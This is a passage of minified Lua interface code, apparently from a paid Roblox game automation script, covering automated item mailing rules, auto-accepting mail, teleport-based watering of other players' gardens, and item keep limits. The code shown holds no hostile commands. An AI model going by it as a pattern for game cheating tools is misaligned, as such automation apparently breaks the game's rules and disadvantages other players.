			Default = h.mail_manual_batch_together;
			Tooltip = "Combines different order items into the same mail when possible.";
			DisabledTooltip = g.GetProMessage(),
			Callback = function(G)
				h.mail_manual_batch_together = G
				a.Save.SaveDataSync()
			end
		})
		H:SetDisabled(not g.GetCheckIfPro())
		V:AddDivider()
		local r
		r = V:AddDropdown("mail_manual_category_ui", {
			Values = {
				"Seeds",
				"Pets";
				"Eggs";
				"Gears";
				"Fruits"
			};
			Default = G,
			Multi = false,
			Text = "\240\159\147\166 Item Category";
			Tooltip = "Choose seeds, pets, eggs, gears or fruits.";
			Callback = function(V)
				if V ~= "Seeds" and (V ~= "Pets" and (V ~= "Eggs" and (V ~= "Gears" and V ~= "Fruits"))) then
					return
				end
				G = V
				y = ""
				g.MailDraftCategory = V
				g.MailDraftItemName = ""
				if d then
					d:SetValues(Z.Mail.GetItemDropdown(V))
					d:SetValue("")
				end
			end
		})
		r:SetValue(G)
		d = V:AddValueDropdown("mail_manual_item_ui", {
			Values = {};
			Default = "";
			Multi = false,
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\142\129 Select Item";
			Tooltip = "Select the item to add to the order.";
			Changed = function(G)
				if type(G) ~= "string" or G == "" then
					return
				end
				y = G
				g.MailDraftItemName = G
			end
		})
		d:SetValues(Z.Mail.GetItemDropdown(G))
		local Y
		Y = V:AddInput("mail_manual_amount_ui", {
			Text = "\240\159\148\162 Amount",
			Default = tostring(j),
			Numeric = true,
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "Amount to send";
			Callback = function(G)
				local V = z(G)
				if not V or V <= 0 then
					g.Notify("Amount must be a whole number above 0", 3)
					Y:SetValue(tostring(j))
					return
				end
				j = V
				g.MailDraftAmount = V
			end
		})
		local e
		e = V:AddInput("mail_manual_fruit_min_kg_ui", {
			Text = "\240\159\141\147 Fruit Min KG",
			Default = tostring(i);
			Numeric = true;
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "0",
			Tooltip = "Fruit mail only. Minimum fruit weight.";
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Min KG must be 0 or above", 3)
					e:SetValue(tostring(i))
					return
				end
				i = V
				g.MailDraftFruitMinKg = V
			end
		})
		local s
		s = V:AddInput("mail_manual_fruit_max_kg_ui", {
			Text = "\240\159\141\147 Fruit Max KG",
			Default = tostring(c);
			Numeric = true;
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "89";
			Tooltip = "Fruit mail only. Maximum fruit weight.";
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Max KG must be 0 or above", 3)
					s:SetValue(tostring(c))
					return
				end
				c = V
				g.MailDraftFruitMaxKg = V
			end
		})
		V:AddValueDropdown("mail_manual_fruit_mutations_ui", {
			Values = Z.FruitFilters.GetMutationNames(),
			Default = {},
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 8;
			Text = "\240\159\141\147 Fruit Mutations",
			Tooltip = "Fruit mail only. No selection sends all mutations.",
			Changed = function(G)
				J = type(G) == "table" and G or {}
				g.MailDraftFruitMutations = J
			end
		})
		V:AddValueDropdown("mail_manual_fruit_variants_ui", {
			Values = Z.FruitFilters.GetVariantNames(),
			Default = {};
			Multi = true;
			Searchable = false;
			MaxVisibleDropdownItems = 5;
			Text = "\240\159\141\147 Fruit Variants",
			Tooltip = "Fruit mail only. No selection sends all variants.",
			Changed = function(G)
				T = type(G) == "table" and G or {}
				g.MailDraftFruitVariants = T
			end
		})
		q = V:AddButton({
			Text = "\226\158\149 Add To Order",
			DisabledTooltip = g.GetProMessage();
			Func = function()
				local V, d = Z.Mail.AddDraftItem(G, y, j, i, c, J, T)
				g.Notify(d, 3)
				if V then
					Z.Mail.SetStatus(d, "#7CFC00")
				else
					Z.Mail.SetStatus(d, "#FF5555")
				end
			end
		})
		q:SetDisabled(not g.GetCheckIfPro())
		E:SetDisabled(not g.GetCheckIfPro())
		V:AddDivider()
		u = V:AddLabel({
			Text = Z.Mail.GetDraftText();
			DoesWrap = true
		})
		g.MailUiRefs.RefreshDraft = function()
			if u then
				u:SetText(Z.Mail.GetDraftText())
			end
		end
		g.MailManualStatusLabel = V:AddLabel({
			Text = g.MailManualUiStatusText;
			DoesWrap = true
		})
		g.MailStartOrderButton = V:AddButton({
			Text = "\226\150\182\239\184\143 Start Sending",
			Disabled = g.MailManualRunning,
			DisabledTooltip = "The current order is still sending.";
			Func = function()
				if not g.GetCheckIfPro() then
					g.Notify(g.GetProMessage(), 5)
					return
				end
				local G, V = Z.Mail.StartManualOrder(g.MailDraftTargetUsername)
				g.Notify(V, G and 3 or 4)
				if not G then
					Z.Mail.SetStatus(V, "#FF5555")
				end
			end
		})
		g.MailStopOrderButton = g.MailStartOrderButton:AddButton({
			Text = "\226\143\185\239\184\143 Stop",
			Disabled = not g.MailManualRunning,
			DisabledTooltip = "No manual order is running.",
			Func = function()
				if not g.GetCheckIfPro() then
					g.Notify(g.GetProMessage(), 5)
					return
				end
				if Z.Mail.StopManualOrder() then
					g.Notify("Manual order stopped", 3)
				end
			end
		})
		g.MailClearOrderButton = V:AddButton({
			Text = "\240\159\167\185 Clear Order",
			Disabled = g.MailManualRunning;
			DisabledTooltip = "The current order is still sending.";
			Func = function()
				if Z.Mail.ClearDraft() then
					Z.Mail.SetManualUiStatus("Order cleared", "#CFCFCF", "\240\159\167\185")
					g.Notify("Order cleared", 2)
				else
					g.Notify("Stop the current order first", 3)
				end
			end
		})
		Z.Mail.RefreshManualUi()
	end
	if y then
		local G = ""
		local V = "Seeds"
		local j = ""
		local i = 5
		local c = 5
		local J = {}
		local T = {}
		local d = 0
		local u = 89
		local q = {}
		local E = {}
		local H
		local r
		local Y
		local e
		y:AddLabel({
			Text = "Sends when the matching inventory amount reaches the trigger.",
			DoesWrap = true
		})
		y:AddInput("mail_rule_username_ui", {
			Text = "\240\159\145\164 Recipient Username",
			Default = "",
			Numeric = false,
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "Roblox username",
			Callback = function(V)
				G = Z.Mail.CleanUsername(V)
			end
		})
		local s
		s = y:AddDropdown("mail_rule_category_ui", {
			Values = {
				"Seeds";
				"Pets";
				"Eggs",
				"Gears";
				"Fruits"
			},
			Default = V,
			Multi = false,
			Text = "\240\159\147\166 Item Category",
			Tooltip = "Choose seeds, pets, eggs, gears or fruits.";
			Callback = function(G)
				if G ~= "Seeds" and (G ~= "Pets" and (G ~= "Eggs" and (G ~= "Gears" and G ~= "Fruits"))) then
					return
				end
				V = G
				j = ""
				if H then
					H:SetValues(Z.Mail.GetItemDropdown(G))
					H:SetValue("")
				end
			end
		})
		s:SetValue(V)
		H = y:AddValueDropdown("mail_rule_item_ui", {
			Values = {};
			Default = "",
			Multi = false;
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\142\129 Select Item",
			Tooltip = "Select the item the rule will send.",
			Changed = function(G)
				if type(G) ~= "string" or G == "" then
					return
				end
				j = G
			end
		})
		H:SetValues(Z.Mail.GetItemDropdown(V))
		local N
		N = y:AddInput("mail_rule_trigger_ui", {
			Text = "\240\159\142\175 Trigger Amount";
			Default = tostring(i);
			Numeric = true;
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "Example: 5",
			Tooltip = "The rule starts when you own at least this amount.";
			Callback = function(G)
				local V = z(G)
				if not V or V <= 0 then
					g.Notify("Trigger must be above 0", 3)
					N:SetValue(tostring(i))
					return
				end
				i = V
			end
		})
		local W
		W = y:AddInput("mail_rule_send_amount_ui", {
			Text = "\240\159\147\164 Send Amount",
			Default = tostring(c),
			Numeric = true,
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "Example: 5";
			Tooltip = "How many matching items to send each time the rule runs.",
			Callback = function(G)
				local V = z(G)
				if not V or V <= 0 then
					g.Notify("Send amount must be above 0", 3)
					W:SetValue(tostring(c))
					return
				end
				c = V
			end
		})
		local X
		X = y:AddValueDropdown("mail_rule_pet_types_ui", {
			Values = {
				"Normal",
				"Rainbow"
			};
			Default = {},
			Multi = true;
			Searchable = false,
			MaxVisibleDropdownItems = 5,
			Text = "\226\156\168 Pet Variant";
			Tooltip = "Pet rules only. No selection sends all variants.",
			Changed = function(G)
				J = type(G) == "table" and G or {}
			end
		})
		X:SetValue({})
		local l
		l = y:AddValueDropdown("mail_rule_pet_sizes_ui", {
			Values = {
				"Normal";
				"Big",
				"Huge"
			};
			Default = {};
			Multi = true,
			Searchable = false,
			MaxVisibleDropdownItems = 5,
			Text = "\240\159\147\143 Pet Size",
			Tooltip = "Pet rules only. No selection sends all sizes.",
			Changed = function(G)
				T = type(G) == "table" and G or {}
			end
		})
		l:SetValue({})
		local B
		B = y:AddInput("mail_rule_fruit_min_kg_ui", {
			Text = "\240\159\141\147 Fruit Min KG",
			Default = tostring(d),
			Numeric = true,
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "0";
			Tooltip = "Fruit rules only. Minimum fruit weight.";
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Min KG must be 0 or above", 3)
					B:SetValue(tostring(d))
					return
				end
				d = V
			end
		})
		local L
		L = y:AddInput("mail_rule_fruit_max_kg_ui", {
			Text = "\240\159\141\147 Fruit Max KG";
			Default = tostring(u),
			Numeric = true,
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "89";
			Tooltip = "Fruit rules only. Maximum fruit weight.";
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Max KG must be 0 or above", 3)
					L:SetValue(tostring(u))
					return
				end
				u = V
			end
		})
		y:AddValueDropdown("mail_rule_fruit_mutations_ui", {
			Values = Z.FruitFilters.GetMutationNames(),
			Default = {};
			Multi = true;
			Searchable = true,
			MaxVisibleDropdownItems = 8;
			Text = "\240\159\141\147 Fruit Mutations",
			Tooltip = "Fruit rules only. No selection sends all mutations.";
			Changed = function(G)
				q = type(G) == "table" and G or {}
			end
		})
		y:AddValueDropdown("mail_rule_fruit_variants_ui", {
			Values = Z.FruitFilters.GetVariantNames(),
			Default = {};
			Multi = true;
			Searchable = false,
			MaxVisibleDropdownItems = 5;
			Text = "\240\159\141\147 Fruit Variants";
			Tooltip = "Fruit rules only. No selection sends all variants.";
			Changed = function(G)
				E = type(G) == "table" and G or {}
			end
		})
		e = y:AddButton({
			Text = "\226\158\149 Add Auto Rule",
			Func = function()
				local y, a = Z.Mail.LookupRecipient(G)
				if not y then
					g.Notify(a, 4)
					Z.Mail.SetStatus(a, "#FF5555")
					return
				end
				local H, r = Z.Mail.AddRule(y, V, j, i, c, J, T, d, u, q, E)
				if H then
					g.Notify("Rule added: " .. r, 3)
					Z.Mail.SetStatus("Auto rule added", "#7CFC00")
				else
					g.Notify(r, 4)
					Z.Mail.SetStatus(r, "#FF5555")
				end
			end
		})
		e:SetDisabled(not g.GetCheckIfPro())
		y:AddDivider()
		r = y:AddValueDropdown("mail_active_rules_ui", {
			Values = {},
			Default = "";
			Multi = false;
			Searchable = true,
			MaxVisibleDropdownItems = 8,
			Text = "\240\159\147\139 Active Rules";
			Tooltip = "Select a rule to enable, disable or remove it.",
			Changed = function(G)
				if type(G) ~= "string" then
					return
				end
				g.MailSelectedRuleId = G
				local V = type(h.mail_auto_rules) == "table" and h.mail_auto_rules[G]
				if Y and type(V) == "table" then
					Y:SetText(string.format("%s | @%s | Trigger %d | Send %d", V.enabled == true and "Enabled" or "Disabled", tostring(V.targetUsername or "?"), tonumber(V.triggerAmount) or 0, tonumber(V.sendAmount) or 0))
				end
			end
		})
		Y = y:AddLabel({
			Text = "Select a rule";
			DoesWrap = true
		})
		g.MailUiRefs.RefreshRules = function()
			if r then
				r:SetValues(Z.Mail.GetRuleDropdown())
			end
			if Y and next(h.mail_auto_rules or {}) == nil then
				Y:SetText("<font color=\'#888888\'>No automatic rules</font>")
			end
		end
		g.MailUiRefs.RefreshRules()
		local m = y:AddButton({
			Text = "\240\159\148\132 Enable / Disable";
			Func = function()
				local G, V = Z.Mail.ToggleRule(g.MailSelectedRuleId)
				if not G then
					g.Notify("Select a rule first", 3)
					return
				end
				g.Notify(V and "Rule enabled" or "Rule disabled", 3)
			end
		})
		m:AddButton({
			Text = "\240\159\151\145\239\184\143 Remove Rule";
			Func = function()
				if not Z.Mail.RemoveRule(g.MailSelectedRuleId) then
					g.Notify("Select a rule first", 3)
					return
				end
				g.MailSelectedRuleId = ""
				Y:SetText("Select a rule")
				g.Notify("Rule removed", 3)
			end
		})
		y:AddDivider()
		local K
		K = y:AddToggle("mail_auto_batch_together_ui", {
			Text = "\240\159\147\166 Combine Automatic Rules";
			Default = h.mail_auto_batch_together,
			Tooltip = "Combines matching rules for the same recipient into one mail.",
			DisabledTooltip = g.GetProMessage(),
			Callback = function(G)
				h.mail_auto_batch_together = G
				a.Save.SaveDataSync()
			end
		})
		K:SetDisabled(not g.GetCheckIfPro())
		y:AddDivider()
		local b
		b = y:AddToggle("mail_auto_send_enabled_ui", {
			Text = "\240\159\147\164 Enable Automatic Send",
			Default = h.mail_auto_send_enabled,
			Tooltip = "Runs enabled mail rules when their trigger is reached.",
			DisabledTooltip = g.GetProMessage();
			Callback = function(G)
				h.mail_auto_send_enabled = G
				if G then
					Z.Mail.SetStatus("Automatic send enabled", "#7CFC00")
				elseif not h.mail_auto_accept and not g.MailManualRunning then
					Z.Mail.ClearStatus()
				end
				a.Save.SaveDataSync()
			end
		})
		b:SetDisabled(not g.GetCheckIfPro())
	end
	if j then
		local G
		local V
		j:AddLabel({
			Text = "Stores the latest 50 completed manual order receipts.",
			DoesWrap = true
		})
		G = j:AddValueDropdown("mail_receipts_ui", {
			Values = {},
			Default = "",
			Multi = false,
			Searchable = true,
			MaxVisibleDropdownItems = 8;
			Text = "\240\159\167\190 Select Receipt";
			Tooltip = "Select a receipt to view or copy it.",
			Changed = function(G)
				local y = tonumber(G)
				local Z = y and h.mail_receipts[y]
				if type(Z) ~= "string" then
					return
				end
				g.MailSelectedReceipt = Z
				if V then
					V:SetText(Z)
				end
			end
		})
		V = j:AddLabel({
			Text = "<font color=\'#888888\'>No receipt selected</font>";
			DoesWrap = true
		})
		g.MailUiRefs.RefreshReceipts = function()
			if G then
				G:SetValues(Z.Mail.GetReceiptDropdown())
			end
			if V and # h.mail_receipts == 0 then
				V:SetText("<font color=\'#888888\'>No receipts saved</font>")
			end
		end
		g.MailUiRefs.RefreshReceipts()
		local y = j:AddButton({
			Text = "\240\159\147\139 Copy Receipt";
			Func = function()
				if g.MailSelectedReceipt == "" then
					g.Notify("Select a receipt first", 3)
					return
				end
				q.CopyToClipBoard(g.MailSelectedReceipt)
			end
		})
		y:AddButton({
			Text = "\240\159\167\185 Clear Receipts",
			Func = function()
				h.mail_receipts = {}
				g.MailSelectedReceipt = ""
				V:SetText("<font color=\'#888888\'>No receipts saved</font>")
				g.MailUiRefs.RefreshReceipts()
				a.Save.SaveDataSync()
				g.Notify("Receipts cleared", 3)
			end
		})
	end
	if i then
		i:AddLabel({
			Text = "Claims item mail automatically. Guild invitations are not accepted.";
			DoesWrap = true
		})
		i:AddToggle("mail_auto_accept_ui", {
			Text = "\240\159\147\165 Auto Accept Incoming Mail";
			Default = h.mail_auto_accept;
			Tooltip = "Automatically claims incoming item mail.",
			Callback = function(G)
				h.mail_auto_accept = G
				if G then
					Z.Mail.SetStatus("Auto accept enabled", "#7CFC00")
					task.defer(function()
						Z.Mail.ClaimInbox(false)
					end)
				elseif not h.mail_auto_send_enabled and not g.MailManualRunning then
					Z.Mail.ClearStatus()
				end
				a.Save.SaveDataSync()
			end
		})
		local G = ""
		local V = 1
		local y = i:AddValueDropdown("mail_auto_accept_multiplier_fruit_ui", {
			Values = Z.Mail.GetFruitDropdown(),
			Default = "",
			Multi = false;
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\140\177 Accept Fruit",
			Tooltip = "Choose the fruit for an incoming mail multiplier rule.",
			Changed = function(V)
				G = tostring(V or "")
			end
		})
		local j = i:AddValueDropdown("mail_auto_accept_multiplier_value_ui", {
			Values = Z.SellMultiplierOverrides.GetMultiplierDropdownSellMultiplierOverrides(),
			Default = "1";
			Multi = false;
			Searchable = false,
			MaxVisibleDropdownItems = 5,
			Text = "\240\159\147\136 Accept At Multiplier";
			Tooltip = "Accepts mail containing this fruit when its live multiplier reaches this value.",
			Changed = function(G)
				V = math.clamp(tonumber(G) or 1, 1, 5)
			end
		})
		j:SetValue("1")
		i:AddButton({
			Text = "\226\156\133 Add Accept Rule";
			Tooltip = "Adds or updates this incoming mail rule.";
			Func = function()
				local y, j = Z.Mail.SaveAutoAcceptMultiplierRuleMail(G, V)
				g.Notify(y and "Mail accept rule enabled" or tostring(j or "Could not enable rule"), y and 2 or 3)
			end
		})
		g.MailAutoAcceptMultiplierLabel = i:AddLabel({
			Text = Z.Mail.GetAutoAcceptMultiplierSummaryMail(),
			DoesWrap = true
		})
		i:AddButton({
			Text = "\240\159\167\185 Clear All Rules";
			Tooltip = "Removes all incoming mail multiplier rules.";
			Func = function()
				Z.Mail.ClearAutoAcceptMultiplierRulesMail()
				g.Notify("Mail accept rules cleared", 2)
			end
		})
		i:AddButton({
			Text = "\240\159\147\172 Claim Existing Mail",
			Func = function()
				task.spawn(function()
					local G = Z.Mail.ClaimInbox(true)
					g.Notify(string.format("Claimed %d mail", G), 3)
				end)
			end
		})
	end
end
g.GiftUi = function()
	local G = d:AddTab({
		Name = "\240\159\142\129 Gift System",
		Description = "Send and receive gifts",
		Icon = "gift"
	})
	if Z.GiftSystem and type(Z.GiftSystem.UiGiftSystem) == "function" then
		Z.GiftSystem.UiGiftSystem(G)
	end
	if Z.AutoDropItems and type(Z.AutoDropItems.UiAutoDropItems) == "function" then
		Z.AutoDropItems.UiAutoDropItems(G)
	end
end
g.PremiumUi = function()
	local G = d:AddTab({
		Name = "Premium " .. g.GetProLabel(),
		Description = "Premium systems",
		Icon = "crown"
	})
	local V = G.TabLabel
	N.applySmoothRainbow(V, .1)
	local j = G:AddLeftGroupbox("Premium Performance", "cloud-rain")
	local i = G:AddLeftGroupbox("Pot Weather Guard", "shield")
	local c = G:AddRightGroupbox("Double or Nothing", "dice-5")
	local J = G:AddLeftGroupbox("Sprinkler Placement", "cloud-rain")
	local u = G:AddRightGroupbox("Server Project", "server")
	local E = G:AddRightGroupbox("Stack Keep Overrides", "package-check")
	local H = G:AddLeftGroupbox("<font color=\"rgb(75, 255, 150)\">Friend Garden</font> <font color=\"rgb(255, 220, 90)\">Care</font>", "sprout")
	local r = G:AddRightGroupbox("Sprinkler Overrides", "list-plus")
	if H then
		if not g.GetCheckIfPro() then
			H:AddLabel({
				Text = g.GetProMessage(),
				DoesWrap = true
			})
		end
		H:AddLabel({
			Text = "Uses selected watering cans and places one of each selected sprinkler.<br/>Saved positions belong to each selected player and follow their plot rotation.<br/>Players outside the current server are ignored until they join.";
			DoesWrap = true
		})
		local G = H:AddValueDropdown("friend_garden_care_friends_ui", {
			Values = Z.FriendGardenCare.GetSavedFriendDropdownFriendGardenCare(),
			Default = {};
			Multi = true;
			Searchable = true,
			MaxVisibleDropdownItems = 8;
			Text = "\240\159\145\165 Select Players";
			Tooltip = "Selected players stay saved even when they leave the server.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.friend_garden_care_friends = G
				Z.FriendGardenCare.ResetProgressFriendGardenCare()
				a.Save.SaveDataSync()
				local V = g.FriendGardenCareUi.LocationLabelFriendGardenCare
				if V and type(V.SetText) == "function" then
					V:SetText(Z.FriendGardenCare.GetSavedPositionTextFriendGardenCare())
				end
			end
		})
		g.FriendGardenCareUi.FriendDropdownFriendGardenCare = G
		G:SetValue(h.friend_garden_care_friends, true)
		H:AddButton({
			Text = "\226\153\187\239\184\143 Refresh Players";
			Tooltip = "Reloads players in the current server and keeps saved selections.";
			Func = function()
				Z.FriendGardenCare.RefreshFriendDropdownFriendGardenCare(true)
			end
		})
		H:AddButton({
			Text = "\240\159\167\185 Clear Players",
			Tooltip = "Removes every saved player from this system.",
			Func = function()
				h.friend_garden_care_friends = {}
				table.clear(Z.FriendGardenCare.FriendNamesFriendGardenCare)
				Z.FriendGardenCare.ResetProgressFriendGardenCare()
				G:SetValue({}, true)
				Z.FriendGardenCare.RefreshFriendDropdownFriendGardenCare(false)
				a.Save.SaveDataSync()
				g.Notify("Saved players cleared", 3)
			end
		})
		local V = H:AddDropdown("friend_garden_care_location_mode_ui", {
			Values = Z.Farm.GetPlacementModeOptionsFarm(true, nil, {
				"Saved Location"
			});
			Default = h.friend_garden_care_location_mode;
			Multi = false;
			Text = "\240\159\147\141 Location",
			Tooltip = "Players without a saved location automatically use the default farm placement.";
			Callback = function(G)
				if G ~= "Saved Location" and not Z.Farm.IsPlacementModeFarm(G) then
					return
				end
				h.friend_garden_care_location_mode = G
				Z.FriendGardenCare.ResetProgressFriendGardenCare()
				a.Save.SaveDataSync()
			end
		})
		V:SetValue(h.friend_garden_care_location_mode)
		local y = H:AddLabel({
			Text = Z.FriendGardenCare.GetSavedPositionTextFriendGardenCare(),
			DoesWrap = true
		})
		g.FriendGardenCareUi.LocationLabelFriendGardenCare = y
		H:AddButton({
			Text = "\240\159\147\140 Copy CFrame";
			Tooltip = "Stand inside a selected player\'s plant area. The location is saved only for that player.";
			Func = function()
				local G, j = Z.FriendGardenCare.SaveCurrentPositionFriendGardenCare()
				g.Notify(j, 3)
				if G then
					V:SetValue("Saved Location")
					y:SetText(Z.FriendGardenCare.GetSavedPositionTextFriendGardenCare())
				end
			end
		})
		local j = H:AddValueDropdown("friend_garden_care_watering_cans_ui", {
			Values = Z.WaterPlants.GetCanDropdown();
			Default = {},
			Multi = true,
			Searchable = true,
			MaxVisibleDropdownItems = 6;
			Text = "\240\159\146\167 Watering Cans";
			Tooltip = "Selected cans are spent at each online player\'s location.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.friend_garden_care_watering_cans = G
				Z.FriendGardenCare.ResetProgressFriendGardenCare()
				a.Save.SaveDataSync()
			end
		})
		j:SetValue(h.friend_garden_care_watering_cans)
		H:AddToggle("friend_garden_care_use_speed_pets_ui", {
			Text = "\240\159\144\135 Use Speed Pets";
			Default = h.friend_garden_care_use_speed_pets == true;
			Tooltip = "Temporarily equips your best Bunny speed pets while travelling to water players, then restores your previous pets after the full run.";
			Callback = function(G)
				h.friend_garden_care_use_speed_pets = G == true
				if h.friend_garden_care_use_speed_pets ~= true and Z.FriendGardenCare.BusyFriendGardenCare ~= true then
					Z.FriendGardenCare.RestoreSpeedPetsFriendGardenCare()
				end
				a.Save.SaveDataSync()
			end
		})
		local i = H:AddValueDropdown("friend_garden_care_sprinklers_ui", {
			Values = Z.SprinklerPlacer.GetDropdown();
			Default = {},
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 8;
			Text = "\240\159\146\166 Sprinklers";
			Tooltip = "Places one available sprinkler of every selected type for each online player.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.friend_garden_care_sprinklers = G
				Z.FriendGardenCare.ResetProgressFriendGardenCare()
				a.Save.SaveDataSync()
			end
		})
		i:SetValue(h.friend_garden_care_sprinklers)
		local c
		c = H:AddInput("friend_garden_care_placement_delay_ui", {
			Text = "\226\143\177\239\184\143 Placement Delay",
			Default = tostring(h.friend_garden_care_placement_delay);
			Numeric = true,
			AllowEmpty = false,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "0.15",
			Tooltip = "Delay between successful watering and sprinkler actions. Minimum 0.001 seconds.",
			Callback = function(G)
				local V = tonumber(G)
				if not V or V < .001 then
					g.Notify("Placement delay must be 0.001 or higher", 3)
					c:SetValue(tostring(h.friend_garden_care_placement_delay))
					return
				end
				h.friend_garden_care_placement_delay = V
				a.Save.SaveDataSync()
			end
		})
		H:AddDivider()
		local J
		J = H:AddInput("friend_garden_care_max_watering_ui", {
			Text = "\240\159\148\162 Max Watering Limit";
			Default = tostring(h.friend_garden_care_max_watering);
			Numeric = true;
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "0",
			Tooltip = "Maximum cans to use for each player. 0 spends every available selected can.",
			Callback = function(G)
				local V = z(G)
				if not V or V < 0 then
					g.Notify("Max watering limit must be 0 or higher", 3)
					J:SetValue(tostring(h.friend_garden_care_max_watering))
					return
				end
				h.friend_garden_care_max_watering = V
				Z.FriendGardenCare.ResetProgressFriendGardenCare()
				a.Save.SaveDataSync()
			end
		})
		local T
		T = H:AddToggle("friend_garden_care_enabled_ui", {
			Text = "\226\156\133 Enable System";
			Default = h.friend_garden_care_enabled == true;
			Tooltip = "Runs only for selected players who are currently in the server.",
			DisabledTooltip = g.GetProMessage(),
			Callback = function(G)
				h.friend_garden_care_enabled = G == true
				Z.FriendGardenCare.ResetProgressFriendGardenCare()
				if h.friend_garden_care_enabled ~= true then
					Z.FriendGardenCare.CleanupToolFriendGardenCare()
					Z.Teleport.UnlockTeleport(g.TeleportLockNames.FriendGardenCare)
					Z.FriendGardenCare.ClearStatusFriendGardenCare()
				end
				a.Save.SaveDataSync()
			end
		})
		g.FriendGardenCareUi.EnableToggleFriendGardenCare = T
		T:SetDisabled(not g.GetCheckIfPro())
		task.spawn(function()
			task.wait(.2)
			Z.FriendGardenCare.RefreshFriendDropdownFriendGardenCare(false)
		end)
	end
	if u then
		local G = q.GetGameServerType()
		local V = ((G == "Private" or G == "Reserved")) and "Private server detected." or (G == "Standard" and "Public server detected." or "Server type could not be detected.")
		u:AddLabel({
			Text = V,
			DoesWrap = true
		})
		u:AddToggle("server_project_kick_public_ui", {
			Text = "Kick If Public Server",
			Default = h.server_project_kick_public == true,
			Tooltip = "Kicks you when this account joins a public server.",
			Callback = function(G)
				h.server_project_kick_public = G == true
				a.Save.SaveData()
				if G == true and q.IsGamePublicServer() then
					y.LocalPlayer:Kick("public server detected")
				end
			end
		})
	end
	if E then
		local G = "Gear"
		local V = ""
		local y = 30
		local j = {}
		local i = 0
		local c
		local J
		local function T()
			for G, V in ipairs(j) do
				if V.Holder and typeof(V.Holder) == "Instance" then
					V.Holder:Destroy()
				end
			end
			table.clear(j)
			if E.Resize then
				E:Resize()
			end
		end
		local function d()
			if c then
				c:SetValues(Z.StackKeepOverrides.GetItemDropdownStackKeepOverrides(G))
				c:SetValue("")
			end
			V = ""
		end
		local u
		u = function()
			T()
			i += 1
			local G = Z.StackKeepOverrides.GetActiveKeysStackKeepOverrides()
			if # G == 0 then
				local G = E:AddLabel({
					Text = "<font color=\'#888888\'>No active keep overrides</font>";
					DoesWrap = true
				})
				table.insert(j, G)
			else
				for G, V in ipairs(G) do
					local y, c = (tostring(V)):match("^(.-)|(.+)$")
					y = tostring(y or "")
					c = tostring(c or "")
					local J = Z.StackKeepOverrides.GetKeepAmountStackKeepOverrides(y, c) or tonumber(h.stack_keep_overrides[V]) or 0
					local T = E:AddToggle(string.format("stack_keep_active_%d_%d", i, G), {
						Text = string.format("%s: %s <font color=\'#7CFC00\'>Keep: %d</font>", y, c, J),
						Default = true;
						Tooltip = "Disable this keep override.",
						Callback = function(G)
							if G then
								return
							end
							Z.StackKeepOverrides.RemoveKeepAmountStackKeepOverrides(y, c)
							a.Save.SaveDataSync()
							task.defer(u)
						end
					})
					table.insert(j, T)
				end
			end
			if E.Resize then
				E:Resize()
			end
		end
		E:AddLabel({
			Text = "Keeps the selected seed or gear amount in your bag. Systems treat it as out of stock once the count reaches the keep amount.";
			DoesWrap = true
		})
		local q = E:AddToggle("stack_keep_overrides_enabled_ui", {
			Text = "Enable Stack Keep Overrides";
			Default = h.stack_keep_overrides_enabled == true;
			Tooltip = "Stops supported systems from using selected seeds or gear after the keep amount is reached.",
			Callback = function(G)
				if not g.GetCheckIfPro() then
					h.stack_keep_overrides_enabled = false
					a.Save.SaveData()
					return
				end
				h.stack_keep_overrides_enabled = G == true
				a.Save.SaveData()
			end
		})
		q:SetDisabled(not g.GetCheckIfPro())
		E:AddDropdown("stack_keep_override_category_ui", {
			Values = {
				"Gear",
				"Seed"
			},
			Default = G,
			Multi = false,
			Text = "\240\159\147\166 Type",
			Tooltip = "Choose whether to reserve seeds or gear.",
			Callback = function(V)
				if type(V) ~= "string" or V == "" then
					return
				end
				G = V
				d()
			end
		})
		c = E:AddValueDropdown("stack_keep_override_item_ui", {
			Values = {};
			Default = "",
			Multi = false;
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\142\146 Item";
			Tooltip = "Select the item to keep in your bag.";
			Changed = function(G)
				if type(G) ~= "string" then
					return
				end
				V = G
			end
		})
		d()
		J = E:AddInput("stack_keep_override_amount_ui", {
			Text = "\240\159\147\140 Keep Amount",
			Default = tostring(y);
			Numeric = true,
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "30",
			Tooltip = "The system will stop using this item when the count is this amount or lower.",
			Callback = function(G)
				local V = z(G)
				if not V or V < 0 then
					g.Notify("Keep amount must be 0 or higher", 3)
					J:SetValue(tostring(y))
					return
				end
				y = V
			end
		})
		E:AddButton({
			Text = "\226\158\149 Add / Update Rule",
			Func = function()
				if not g.GetCheckIfPro() then
					g.Notify(g.GetProMessage(), 5)
					return
				end
				if V == "" then
					g.Notify("Select an item first", 3)
					return
				end
				if not Z.StackKeepOverrides.SetKeepAmountStackKeepOverrides(G, V, y) then
					g.Notify("Could not save keep override", 3)
					return
				end
				a.Save.SaveDataSync()
				u()
			end
		})
		E:AddDivider()
		E:AddLabel({
